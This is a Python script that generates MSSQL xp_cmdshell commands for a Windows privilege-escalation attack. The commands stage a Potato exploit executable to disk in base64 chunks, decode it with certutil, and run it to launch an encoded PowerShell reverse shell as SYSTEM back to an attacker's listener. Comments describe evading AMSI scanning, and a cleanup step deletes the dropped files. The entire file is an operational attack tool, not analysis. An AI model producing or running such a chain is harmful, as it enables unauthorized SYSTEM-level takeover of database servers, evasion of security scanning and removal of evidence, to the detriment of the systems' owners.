#!/usr/bin/env python3
"""Variant C -- no-network ON-DISK (Form A, most robust: no AMSI, no reflection).
Stage the Potato exe to DISK via certutil, then run it with the per-tool SYSTEM command
(revshell folded in) so the callback lands AS SYSTEM. On-disk PEs aren't AMSI-scanned.
Edit LHOST/LPORT/TOOL in _winpriv_common.py.

Usage: python3 gen_forma.py /path/to/<TOOL>.exe   (defaults to ./<TOOL>)
"""
import base64, sys
import _winpriv_common as P

_a = sys.argv[1:]
STAGE = (_a[_a.index("--stagedir") + 1] if "--stagedir" in _a else P.STAGE).rstrip("\\")
_pos  = [a for i, a in enumerate(_a) if not a.startswith("--") and (i == 0 or _a[i-1] != "--stagedir")]
SRC   = _pos[0] if _pos else P.TOOL       # first non-flag arg = the exe to stage
B64F  = f"{STAGE}\\g.b64"                  # transient base64 text  (--stagedir overrides; noexec-Temp lockdowns)
EXEF  = f"{STAGE}\\g.exe"                  # decoded exe on disk (NOT AMSI-scanned)
CHUNK = 6000                               # < 8191 cmd-line limit, headroom for the wrapper

runargs = P.cmdline_for(P.TOOL)            # e.g.  -cmd "powershell -e <REV_B64>"

data = base64.b64encode(P.read_tool(SRC)).decode()
nch  = (len(data) + CHUNK - 1) // CHUNK
print(f"-- tool={P.TOOL}  revshell={P.LHOST}:{P.LPORT}  (start `nc -lvnp {P.LPORT}` first)")
print(f"-- STEP 1: stage {SRC} ({len(data)} b64 chars) -> {B64F} in {nch} chunk(s). Run IN ORDER:")
for i in range(0, len(data), CHUNK):
    op = ">" if i == 0 else ">>"           # first creates, rest append
    print(f"EXEC master..xp_cmdshell 'echo {data[i:i+CHUNK]}{op}{B64F}';")
print(f"\n-- STEP 2: decode base64 -> exe on disk, delete the .b64:")
print(f"EXEC master..xp_cmdshell 'certutil -decode {B64F} {EXEF}';")
print(f"EXEC master..xp_cmdshell 'del {B64F}';")
print(f"\n-- STEP 3: run the Potato with the revshell as its SYSTEM command:")
print(f"EXEC master..xp_cmdshell '{EXEF} {runargs}';")
print(f"\n-- STEP 4 (cleanup, after you have the shell):")
print(f"EXEC master..xp_cmdshell 'del {EXEF}';")
print(f"\n-- (chunks: {nch}  |  no AMSI, no reflection, on-disk PE)")
